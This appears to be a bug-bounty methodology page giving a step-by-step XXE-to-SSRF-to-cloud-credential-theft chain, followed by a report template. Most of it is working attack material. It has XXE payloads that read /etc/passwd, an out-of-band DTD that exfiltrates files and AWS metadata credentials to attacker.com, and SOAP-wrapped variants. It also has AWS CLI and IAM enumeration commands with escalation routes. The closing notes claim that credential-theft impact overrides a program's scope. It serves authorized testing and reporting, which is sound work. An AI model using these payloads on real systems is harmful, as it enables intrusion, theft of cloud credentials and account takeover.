XXE to SSRF to Cloud RCE
Why This Chain Works
Legacy SOAP endpoints and XML-accepting APIs almost never have DTD processing disabled. The developer who built the SOAP layer in 2014 didn't think about XXE because it wasn't on the radar the same way it is now, and the service has been running since then without a security review. XXE gives you SSRF for free, via the out-of-band data exfiltration mechanism built into the XML standard. Once you have SSRF inside a cloud-hosted service, the chain to SSRF to Cloud RCE is already documented. This page focuses on the entry: getting from XML input to an SSRF that reaches the metadata endpoint.

Step-by-Step
1. Find the XML Surface
XML processing is common in:

SOAP web services (Content-Type: text/xml or application/soap+xml)
REST APIs that accept application/xml
File upload endpoints for .docx, .xlsx, .odt (all are ZIP files containing XML)
SVG file uploads (SVGs are XML)
RSS/Atom feed importers
XML-based configuration file imports
PDF generators that accept HTML or XML templates

When you find an XML input, your first probe is always XXE.
2. Basic XXE Probe
In-band test (response-based):
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
If root/linux/etc/passwd contents appear in the response - you have in-band XXE.
Out-of-band test (blind XXE):
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://YOUR.oast.me/xxe">
  %remote;
]>
<root><data>test</data></root>
If your Burp Collaborator or interactsh receives a DNS/HTTP hit, DTD processing is enabled and you can exfiltrate data.
3. OOB Data Exfiltration (Blind XXE)
Host a malicious DTD on your server at attacker.com/evil.dtd:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY % send SYSTEM 'attacker.com/%file;'>">
%wrap;
%send;
Trigger it with:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "attacker.com/evil.dtd">
  %dtd;
]>
<foo>bar</foo>
The server fetches your DTD, resolves the %file entity, then sends the content to your server in a query parameter.
4. Pivot to SSRF - Hit the Metadata Endpoint
Replace the file:// entity with an http:// URL pointing at the cloud metadata endpoint:
AWS:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&ssrf;</data></root>
If in-band XXE exists, the role name appears in the response body. If blind, use the OOB exfiltration DTD with the HTTP URL:
<!ENTITY % ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY % wrap "<!ENTITY % send SYSTEM 'attacker.com/%ssrf;'>">
%wrap;
%send;
You receive the IAM role name at your server.
5. Extract the Credentials
Second request to get the actual credentials:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY creds SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME_HERE">
]>
<root><data>&creds;</data></root>
Response (in-band) or OOB data contains:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-01-01T00:00:00Z"
}
6. Complete the SSRF to Cloud RCE Chain
From here the chain continues exactly as documented in SSRF to Cloud RCE:
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
 
aws sts get-caller-identity
# Confirms identity and account number
 
python3 enumerate-iam.py --access-key $AWS_ACCESS_KEY_ID \
  --secret-key $AWS_SECRET_ACCESS_KEY \
  --session-token $AWS_SESSION_TOKEN
# Enumerate all available permissions
From there, escalate via iam:CreateUser, lambda:CreateFunction, ssm:StartSession, or S3 read access depending on what permissions the role holds.
7. SOAP Envelope Specifics
For SOAP endpoints, the XXE entity must be valid XML within the envelope:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soap [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<soap:Envelope xmlns:soap="schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <getUserRequest>
      <userId>&xxe;</userId>
    </getUserRequest>
  </soap:Body>
</soap:Envelope>

PoC Template for Report
1. Endpoint: POST /api/soap/user (Content-Type: text/xml)
2. OOB probe: sent DTD with entity pointing to oast.me/test
   Collaborator received DNS callback - DTD processing confirmed
3. Local file read:
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
   Response includes: root:x:0:0:root:/root:/bin/bash (partial)
4. SSRF to metadata:
   <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
   Response includes role name: "app-prod-role"
5. Credential extraction:
   <!ENTITY creds SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-prod-role">
   Response includes AccessKeyId: ASIA..., SecretAccessKey, Token
6. AWS identity:
   aws sts get-caller-identity -> arn:aws:iam::123456789:assumed-role/app-prod-role/i-abc123
7. enumerate-iam output attached showing iam:CreateUser permission.

Reporting Notes
This is a three-step chain. Present it in three parts with clear separation: XXE confirmed, SSRF to metadata, credentials and permissions enumeration. Include the OOB callback screenshot from Burp Collaborator, the credential JSON (redact the actual secret values), and the sts get-caller-identity output. Programs that do not have XXE in scope still cover this chain when it produces cloud credential theft - the impact argument overrides most scope ambiguity.
